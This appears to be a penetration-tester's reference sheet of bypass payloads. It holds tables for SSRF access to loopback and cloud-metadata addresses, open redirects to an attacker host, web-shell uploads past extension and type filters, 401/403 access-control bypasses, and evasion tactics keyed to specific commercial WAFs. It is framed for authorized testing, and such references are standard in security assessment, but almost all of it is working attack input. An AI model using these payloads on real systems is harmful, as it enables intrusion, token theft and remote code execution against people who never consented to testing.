# Bypass Tables

Consolidated bypass matrices. Reach here when a straight payload is blocked by an allowlist, blacklist, WAF, or auth gate. Authorized testing only — bypass the control, prove the impact, stop.

---

## SSRF IP / host bypass

Server blocks `127.0.0.1` / `localhost` / internal ranges, or enforces a host allowlist. Encode the loopback/metadata address so the validator and the fetcher disagree.

| # | Technique          | Example                                             | Beats                          |
|---|--------------------|-----------------------------------------------------|--------------------------------|
| 1 | Decimal IP         | `http://2130706433/`                                | string match on `127.0.0.1`    |
| 2 | Octal IP           | `http://0177.0.0.1/`  `http://0177.0.0.01/`         | regex expecting dotted-decimal |
| 3 | Hex IP             | `http://0x7f000001/`  `http://0x7f.0x0.0x0.0x1/`    | dotted-decimal validators      |
| 4 | Mixed / short form | `http://127.1/`  `http://0/`  `http://127.0.1/`     | naive octet count checks       |
| 5 | IPv6 loopback      | `http://[::1]/`  `http://[0:0:0:0:0:0:0:1]/`        | IPv4-only blocklists           |
| 6 | IPv6-mapped IPv4   | `http://[::ffff:127.0.0.1]/`  `http://[::ffff:7f00:1]/` | IPv4 blocklists            |
| 7 | Enclosed-alphanum  | `http://ⓛocalhost/` / unicode-normalized hosts      | ascii string filters           |
| 8 | DNS rebinding      | host resolving TTL=0, flips public→127.0.0.1 after check | validate-then-fetch TOCTOU |
| 9 | Attacker DNS → int | `internal.YOURDOMAIN.com` A-record = `169.254.169.254` | allowlist that resolves DNS |
| 10| Redirect bounce    | allowed URL returns `302 → http://169.254.169.254/`  | allowlist checked only on first URL |
| 11| Credential/@ trick | `http://allowed.com@169.254.169.254/`  `http://169.254.169.254#allowed.com` | parser confusion (userinfo vs host) |

Extras: wrap the metadata host in `http://[allowed]\@169.254.169.254`, use `2852039166` (decimal of `169.254.169.254`), or `http://169.254.169.254.nip.io/`. On AWS, `http://instance-data/` also resolves to the metadata IP.

---

## Open-redirect bypass

Target validates the redirect `?next=`/`?url=`/`?return=` param. Get it to send the victim to your host.

| Technique                | Payload                                             |
|--------------------------|-----------------------------------------------------|
| Scheme-relative          | `//evil.com`  `/\evil.com`  `/%2fevil.com`          |
| Backslash confusion      | `https:/\evil.com`  `\/\/evil.com`                  |
| Userinfo @               | `https://trusted.com@evil.com`                      |
| Whitelisted-substring    | `https://trusted.com.evil.com`  `https://evil.com/trusted.com` |
| Whitelisted-prefix host  | `https://trusted.com.evil.com/`                     |
| Missing-slash            | `https:evil.com`  `https:/evil.com`                 |
| CRLF / control chars     | `https://evil.com%0d%0a`  `https://evil.com%09`     |
| Encoded slashes          | `/%09/evil.com`  `/%2F%2Fevil.com`  `%5Cevil.com`   |
| Data / js scheme (if DOM)| `javascript:...`  `data:text/html,...`              |
| Unicode dot / IDN        | `https://evil。com`  `https://ⓔvil.com`             |
| Redirect-to-redirect     | trusted open-redirect chained to yours              |

Chain value: open redirect → OAuth `redirect_uri` token theft (see disclosed-patterns.md).

---

## File-upload bypass

Server restricts uploads by extension/type/content. Get an executable/dangerous file past it.

| # | Technique                | Example                                              |
|---|--------------------------|------------------------------------------------------|
| 1 | Double extension         | `shell.php.jpg`  `shell.jpg.php`                      |
| 2 | Case variation           | `shell.pHp`  `shell.PHP`  `shell.AsP`                 |
| 3 | Alt executable ext       | `.php5 .phtml .pht .phar` / `.asp .aspx .cshtml` / `.jsp .jspx` |
| 4 | Null byte (legacy)       | `shell.php%00.jpg`                                    |
| 5 | Trailing bytes           | `shell.php.` `shell.php ` `shell.php::$DATA` (IIS)    |
| 6 | Content-Type spoof       | send `Content-Type: image/png` with php body         |
| 7 | Magic-byte prefix        | `GIF89a;<?php ...?>` — passes image sniffers          |
| 8 | Config file upload       | `.htaccess` (AddType php), `web.config`, `.user.ini` |
| 9 | Path traversal in name   | `../../var/www/html/shell.php`                        |
| 10| Polyglot / SVG / poly-zip| SVG with embedded JS (stored XSS/XXE); phar/zip slip  |
| 11| MIME/ext mismatch        | valid image ext, `Content-Type` executable, or vice versa |
| 12| Archive path escape      | zip/tar entry `../../` (Zip Slip) on extract          |

Prove RCE only with a benign `id`/callback shell; delete any uploaded artifact afterward.

---

## 403 / 401 bypass

Endpoint returns 403/401. Reach it via header spoofing, path mangling, or method swap.

| Vector      | Attempts                                                                 |
|-------------|--------------------------------------------------------------------------|
| IP headers  | `X-Forwarded-For: 127.0.0.1` · `X-Real-IP` · `X-Originating-IP` · `X-Client-IP` · `X-Forwarded-Host: localhost` |
| Rewrite hdr | `X-Original-URL: /admin` · `X-Rewrite-URL: /admin` · `X-Override-URL`     |
| Path case   | `/Admin` · `/ADMIN` · `/admin/` (trailing slash) · `//admin//`            |
| Path pad    | `/admin/.` · `/admin/./` · `/admin/..;/` · `/./admin` · `/admin%20`       |
| Encoding    | `/%61dmin` · `/admin%2f` · `/admin%09` · `/admin%00` · double `%252e`     |
| Suffix      | `/admin.json` · `/admin.html` · `/admin;.css` · `/admin?` · `/admin#`     |
| Method      | `POST`/`PUT`/`HEAD`/`TRACE`/`OPTIONS` where `GET`=403; `X-HTTP-Method-Override: GET` |
| Version     | HTTP/1.0 · drop `Host` · try `/api/v1` where `/api/v2` blocks             |
| Auth        | empty `Authorization:` · `Authorization: Bearer null` · re-send with no cookies |
| Referer/host| `Referer: https://target/admin` · `Host: localhost`                      |

---

## WAF fingerprint → bypass

Identify the WAF from block-page tells, then pick the evasion class it's weakest against.

| WAF          | Fingerprint tell                                             | Lean on                                              |
|--------------|-------------------------------------------------------------|------------------------------------------------------|
| Cloudflare   | `cf-ray` header, "Attention Required!" 1020 page            | encoding, `/*!...*/`, chunked body, origin-IP direct |
| AWS WAF      | generic 403, `x-amzn-*`, `x-amz-cf-id`                      | case, unicode, oversized body, JSON-nesting          |
| Akamai       | `AkamaiGHost`, reference `#9.x` error                       | header casing, HTTP/2, path param `;`                |
| Imperva/Incap| `X-Iinfo`, `incap_ses`/`visid_incap` cookies, "Incapsula"   | double-encoding, comment injection, nullbyte         |
| F5 BIG-IP ASM| `TS...` cookie, `BigIP`/`X-WA-Info`                        | param pollution, verb tampering, chunked TE          |
| ModSecurity  | `Mod_Security`/"Not Acceptable" 406, OWASP CRS msgs         | inline comments, keyword splitting, encoding         |
| Sucuri       | `X-Sucuri-ID`/`X-Sucuri-Cache`, "Access Denied - Sucuri"    | origin IP, encoding, case                            |

General evasion ladder (any WAF): case-swap → inline comments (`/*!...*/`, `/**/`) → single/double URL-encode → unicode/overlong → whitespace alternatives (`%09 %0a $IFS`) → param pollution → move payload to body/JSON → HTTP/2 or request smuggling → find the origin IP and skip the WAF entirely.
